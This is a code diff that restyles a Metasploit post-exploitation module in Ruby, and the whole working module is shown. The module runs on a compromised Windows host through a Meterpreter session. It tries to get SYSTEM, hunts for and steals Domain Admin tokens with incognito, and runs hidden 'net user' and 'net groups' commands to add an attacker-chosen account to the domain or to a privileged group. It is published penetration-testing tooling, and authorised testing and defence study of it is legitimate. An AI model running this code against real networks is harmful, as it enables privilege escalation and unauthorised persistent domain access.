@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,25 +8,23 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Priv
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Manage Add User to the Domain and/or to a Domain Group',
-        'Description'   => %q{
-              This module adds a user to the Domain and/or to a Domain group. It will
-            check if sufficient privileges are present for certain actions and run
-            getprivs for system.  If you elevated privs to system,the
-            SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to
-            a process that is running as system. If you don't have privs, this script
-            exits.
-          },
-        'License'       => MSF_LICENSE,
-        'Author'        => 'Joshua Abraham <jabra[at]rapid7.com>',
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Manage Add User to the Domain and/or to a Domain Group',
+                      'Description'   => %q(
+                            This module adds a user to the Domain and/or to a Domain group. It will
+                          check if sufficient privileges are present for certain actions and run
+                          getprivs for system.  If you elevated privs to system,the
+                          SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to
+                          a process that is running as system. If you don't have privs, this script
+                          exits.
+                        ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => 'Joshua Abraham <jabra[at]rapid7.com>',
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
     register_options(
       [
         OptString.new('USERNAME',  [true,  'Username to add to the Domain or Domain Group', '']),
@@ -35,7 +34,8 @@ class MetasploitModule < Msf::Post
         OptBool.new('ADDTODOMAIN', [true,  'Add user to the Domain', true]),
         OptString.new('TOKEN',     [false, 'Username or PID of the Token which will be used. If blank, Domain Admin Tokens will be enumerated. (Username doesnt require a Domain)', '']),
         OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', true])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def get_system
@@ -51,56 +51,52 @@ class MetasploitModule < Msf::Post
   def priv_check
     if is_system?
       privs = session.sys.config.getprivs
-      if privs.include?("SeAssignPrimaryTokenPrivilege") and privs.include?("SeIncreaseQuotaPrivilege")
+      if privs.include?("SeAssignPrimaryTokenPrivilege") && privs.include?("SeIncreaseQuotaPrivilege")
         return true
       else
         return false
       end
     elsif is_admin?
-      return true
+      true
     else
-      return false
+      false
     end
   end
 
   ## steal domain admin token
   ## return code: bool
-  def steal_token(domain_user,domain)
-    if session.sys.config.getuid() == domain_user or domain_user == ''
+  def steal_token(domain_user, domain)
+    if (session.sys.config.getuid == domain_user) || (domain_user == '')
       return true
     end
 
     ## load incognito
-    if(! session.incognito)
-      session.core.use("incognito")
-    end
+    session.core.use("incognito") unless session.incognito
 
-    if(! session.incognito)
+    unless session.incognito
       print_status("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
       return false
     end
 
     ## verify domain_user contains a domain
-    if domain_user !~ /\\/
-      domain_user = "#{domain}\\#{domain_user}"
-    else
-      domain_user = ''
-    end
+    domain_user = if domain_user !~ /\\/
+                    "#{domain}\\#{domain_user}"
+                  else
+                    ''
+                  end
 
     ## token is a PID
     target_pid = ''
-    if (datastore['TOKEN'] =~ /^\d+$/)
+    if datastore['TOKEN'] =~ /^\d+$/
       pid = datastore['TOKEN']
 
-      session.sys.process.get_processes().sort_by { rand }.each do |x|
-        if ( pid == x['pid'])
-          target_pid = pid
-        end
+      session.sys.process.get_processes.sort_by { rand }.each do |x|
+        target_pid = pid if pid == x['pid']
       end
     ## token is a Domain User
     else
-      session.sys.process.get_processes().sort_by { rand }.each do |x|
-        if ( x['user'] == domain_user and target_pid == '')
+      session.sys.process.get_processes.sort_by { rand }.each do |x|
+        if (x['user'] == domain_user) && (target_pid == '')
           target_pid = x['pid']
           print_status("Found token for #{domain_user}")
         end
@@ -112,22 +108,20 @@ class MetasploitModule < Msf::Post
       print_status("Stealing token of process ID #{target_pid}")
       res = session.sys.config.steal_token(target_pid)
       if  domain_user != ''
-        domain_user = session.sys.config.getuid()
+        domain_user = session.sys.config.getuid
       else
         print_status("Stealing token of process ID #{target_pid}")
         res = session.sys.config.steal_token(target_pid)
-        if  domain_user != ''
-          domain_user = session.sys.config.getuid()
-        end
+        domain_user = session.sys.config.getuid if domain_user != ''
       end
 
-      if session.sys.config.getuid() != domain_user
-        print_error "Steal Token Failed (running as: #{session.sys.config.getuid()})"
+      if session.sys.config.getuid != domain_user
+        print_error "Steal Token Failed (running as: #{session.sys.config.getuid})"
         return false
       end
     else
       print_status("No process tokens found.")
-      if (domain_user != '')
+      if domain_user != ''
         vprint_status("Trying impersonate_token technique...")
         res = session.incognito.incognito_impersonate_token(domain_user)
       else
@@ -135,76 +129,72 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    return true
+    true
   end
 
   ## enumerate if the session has a domain admin token on it
   ## Return: token_found,token_user,current_user; otherwise false
   def token_hunter(domain)
     ## gather data
-    usr_res = run_cmd("net groups \"Domain Admins\" /domain",false)
+    usr_res = run_cmd("net groups \"Domain Admins\" /domain", false)
     domain_admins = get_members(usr_res.split("\n"))
 
     ## Make sure we meet the requirements before running the module
-    if not priv_check
+    unless priv_check
       print_error("Abort! Did not pass the priv check")
       return false
     end
 
     ## load incognito
-    if(! session.incognito)
-      session.core.use("incognito")
-    end
+    session.core.use("incognito") unless session.incognito
 
-    if(! session.incognito)
+    unless session.incognito
       print_error("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
       return false
     end
 
     domain_admins.each do |da_user|
       ## current user
-      if "#{domain}\\#{da_user}" == session.sys.config.getuid()
+      if "#{domain}\\#{da_user}" == session.sys.config.getuid
         print_good "Found Domain Admin Token: #{session.sid} - #{session.session_host} - #{da_user} (Current User)"
-        return true,'',true
+        return true, '', true
       end
 
       ## parse delegation tokens
       res = session.incognito.incognito_list_tokens(0)
       if res
         res["delegation"].split("\n").each do |user|
-          ndom,nusr = user.split("\\")
-          if not nusr
+          ndom, nusr = user.split("\\")
+          unless nusr
             nusr = ndom
             ndom = nil
           end
-          if ndom == domain and da_user == nusr
-            sid = session.sid
-            peer = session.session_host
-            print_good("Found Domain Admin Token: #{sid} - #{peer} - #{nusr} (Delegation Token)")
-            return true,nusr,false
-          end
+          next unless (ndom == domain) && (da_user == nusr)
+          sid = session.sid
+          peer = session.session_host
+          print_good("Found Domain Admin Token: #{sid} - #{peer} - #{nusr} (Delegation Token)")
+          return true, nusr, false
         end
       end
 
       ## parse process list
-      session.sys.process.get_processes().each do |x|
-        if ( x['user'] == "#{domain}\\#{da_user}")
-          target_pid = x['pid']
-          sid = session.sid
-          peer = session.session_host
-          report_note(
-            :host   => session,
-            :type   => 'domain.token.pid',
-            :data   => { :pid=>target_pid, :sid=>sid, :peer=>peer, :user=>da_user },
-            :update => :unique_data
-          )
-          print_good("Found Domain Admin Token: #{sid} - #{peer} - #{da_user} (PID: #{target_pid})")
-          return true ,da_user, false
-        end
+      session.sys.process.get_processes.each do |x|
+        next unless x['user'] == "#{domain}\\#{da_user}"
+        target_pid = x['pid']
+        sid = session.sid
+        peer = session.session_host
+        report_note(
+          host: session,
+          type: 'domain.token.pid',
+          data: { pid: target_pid, sid: sid, peer: peer, user: da_user },
+          update: :unique_data
+        )
+        print_good("Found Domain Admin Token: #{sid} - #{peer} - #{da_user} (PID: #{target_pid})")
+        return true, da_user, false
       end
     end
 
-    return false
+    false
   end
 
   # Run Method for when run command is issued
@@ -212,34 +202,30 @@ class MetasploitModule < Msf::Post
     print_status("Running module on #{sysinfo['Computer']}")
 
     ## get system, if requested
-    if (session.sys.config.getuid() !~ /SYSTEM/ and datastore['GETSYSTEM'])
+    if session.sys.config.getuid !~ /SYSTEM/ && datastore['GETSYSTEM']
       get_system
     end
 
     ## enum domain
-    domain = get_domain()
-    if domain.nil?
-      return
-    end
+    domain = get_domain
+    return if domain.nil?
 
     ## steal token if neccessary
     if datastore['TOKEN'] == ''
       token_found, token_user, current_user = token_hunter(domain)
-      if token_found && current_user == false
-        datastore['TOKEN'] = token_user
-      end
+      datastore['TOKEN'] = token_user if token_found && current_user == false
     end
 
     ## steal token
-    steal_token_res = steal_token(datastore['TOKEN'],domain)
+    steal_token_res = steal_token(datastore['TOKEN'], domain)
     return if steal_token_res == false
 
     ## verify not running as SYSTEM
-    if (session.sys.config.getuid() =~ /SYSTEM/)
+    if session.sys.config.getuid =~ /SYSTEM/
       print_error("Stealing a Token failed! Still running as SYSTEM")
       return
     else
-      print_status("Now executing commands as #{session.sys.config.getuid()}" )
+      print_status("Now executing commands as #{session.sys.config.getuid}")
     end
 
     already_user = false
@@ -247,9 +233,9 @@ class MetasploitModule < Msf::Post
 
     ## Add user to the domain
     if datastore['ADDTODOMAIN']
-      user_add_res = run_cmd("net user \"#{datastore['USERNAME']}\" /domain",false)
+      user_add_res = run_cmd("net user \"#{datastore['USERNAME']}\" /domain", false)
 
-      if (user_add_res =~ /The command completed successfully/ and user_add_res =~ /Domain Users/)
+      if user_add_res =~ /The command completed successfully/ && user_add_res =~ /Domain Users/
         print_status("#{datastore['USERNAME']} is already a member of the #{domain} domain")
         already_user = true
       else
@@ -262,15 +248,15 @@ class MetasploitModule < Msf::Post
     ## Add user to a domain group
     if datastore['ADDTOGROUP']
       ## check if user is already a member of the group
-      group_add_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain",false)
+      group_add_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain", false)
 
       # Parse Returned data
       members = get_members(group_add_res.split("\n"))
 
       # Show results if we have any, Error if we don't
-      if ! members.empty?
+      unless members.empty?
         members.each do |user|
-          if (user == "#{datastore['USERNAME']}")
+          if user == datastore['USERNAME'].to_s
             print_status("#{datastore['USERNAME']} is already a member of the '#{datastore['GROUP']}' group")
             already_member_group = true
           end
@@ -285,22 +271,20 @@ class MetasploitModule < Msf::Post
     end
 
     ## drop token
-    if (datastore['TOKEN'] != '')
-      res = session.sys.config.drop_token
-    end
+    res = session.sys.config.drop_token if datastore['TOKEN'] != ''
 
     ## verify user was added to domain or domain group
     if datastore['ADDTOGROUP']
       if already_member_group == false
-        net_groups_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain",false)
+        net_groups_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain", false)
 
         # Parse Returned data
         members = get_members(net_groups_res.split("\n"))
 
         # Show results if we have any, Error if we don't
-        if ! members.empty?
+        if !members.empty?
           members.each do |user|
-            if (user == "#{datastore['USERNAME']}")
+            if user == datastore['USERNAME'].to_s
               print_good("#{datastore['USERNAME']} is now a member of the '#{datastore['GROUP']}' group!")
               return
             end
@@ -313,9 +297,9 @@ class MetasploitModule < Msf::Post
       end
     else
       if already_user == false
-        net_user_res = run_cmd("net user \"#{datastore['USERNAME']}\" /domain",false)
+        net_user_res = run_cmd("net user \"#{datastore['USERNAME']}\" /domain", false)
 
-        if (net_user_res =~ /The command completed successfully/ and net_user_res =~ /Domain Users/)
+        if net_user_res =~ /The command completed successfully/ && net_user_res =~ /Domain Users/
           print_good("#{datastore['USERNAME']} is now a member of the #{domain} domain!")
         else
           print_error("Error adding '#{datastore['USERNAME']}' to the domain. Check the password complexity.")
@@ -339,11 +323,11 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    return members
+    members
   end
 
   ## get value from registry key
-  def reg_getvaldata(key,valname)
+  def reg_getvaldata(key, valname)
     value = nil
     begin
       root_key, base_key = client.sys.registry.splitkey(key)
@@ -352,17 +336,17 @@ class MetasploitModule < Msf::Post
       value = v.data
       open_key.close
     end
-    return value
+    value
   end
 
   ## return primary domain from the registry
-  def get_domain()
+  def get_domain
     domain = nil
     begin
       subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
       v_name = "DCName"
       dom_info = reg_getvaldata(subkey, v_name)
-      if not dom_info.nil? and dom_info =~ /\./
+      if !dom_info.nil? && dom_info =~ /\./
         foo = dom_info.split('.')
         domain = foo[1].upcase
       else
@@ -371,13 +355,13 @@ class MetasploitModule < Msf::Post
     rescue
       print_error("This host is not part of a domain.")
     end
-    return domain
+    domain
   end
 
   ## execute cmd and return the response
   ## is required since we need to use the 'UseThreadToken' hash
-  def run_cmd(cmd,token=true)
-    opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token}
+  def run_cmd(cmd, token = true)
+    opts = { 'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token }
     process = session.sys.process.execute(cmd, nil, opts)
     res = ""
     while (d = process.channel.read)
@@ -386,6 +370,6 @@ class MetasploitModule < Msf::Post
     end
     process.channel.close
     process.close
-    return res
+    res
   end
 end
